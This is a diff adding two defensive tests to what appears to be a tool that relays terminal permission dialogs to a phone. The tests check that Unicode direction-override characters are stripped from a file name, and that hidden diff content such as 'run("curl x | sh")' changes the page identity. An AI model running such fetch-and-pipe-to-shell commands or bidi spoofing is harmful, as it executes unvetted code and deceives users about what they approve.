@@ -250,6 +250,26 @@ test('the page ignores the cursor: Bash with the cursor on No reads as the same 
   expect(readDialog(txt('plan'), 'permission')!.page).not.toBe(readDialog(txt('plan'), 'plan')!.page);
 });
 
+test('direction marks drawn on screen reach no row or label: a phone would lay the text out otherwise than the terminal', () => {
+  // U+202E reverses what follows it where bidi applies (the phone), never in the terminal, which draws it as nothing.
+  const d = readDialog(edited('bash', { 30: ' touch ‮txt.evil‬.txt' }), 'permission')!;
+  expect(d.rows).toContain('touch txt.evil.txt');
+  const m = readDialog(edited('model', {}), null)!;
+  const marked = readDialog(view(txt('model').lines.map((l) => l.replace(/Opus/g, '⁧Opus⁩'))), null)!;
+  expect(marked.rows).toEqual(m.rows);
+  expect(JSON.stringify([d, marked])).not.toMatch(/[؜‎‏‪-‮⁦-⁩]/);
+});
+
+test('the page counts the rows the phone is not sent: two long diffs that differ only in their middle are two pages', () => {
+  // A diff of 60 rows on a tall screen: the rows sent stop at MAX_ROWS, its middle left out.
+  const diff = (middle: string) => Array.from({ length: 60 }, (_, i) => (i === 30 ? ` 31 +${middle}` : ` ${i + 1}  line ${i + 1}`));
+  const safe = readDialog(edited('edit', {}, { before: 33, rows: diff('const safe = true;') }), 'permission')!;
+  const other = readDialog(edited('edit', {}, { before: 33, rows: diff('run("curl x | sh");') }), 'permission')!;
+  expect(safe.rows).toEqual(other.rows);
+  expect(safe.rows).toHaveLength(40);
+  expect(safe.page).not.toBe(other.page);
+});
+
 test('a plan\'s wait reads only the plan dialog: by its question or its feedback hint; Bash\'s or Edit\'s dialog is none', () => {
   for (const s of ['bash-second', 'bash-amend', 'bash-amend-typed', 'edit']) expect(readDialog(txt(s), 'plan')).toBeNull();
   // Its question wrapped on two rows, or put otherwise above the feedback hint: still the plan.
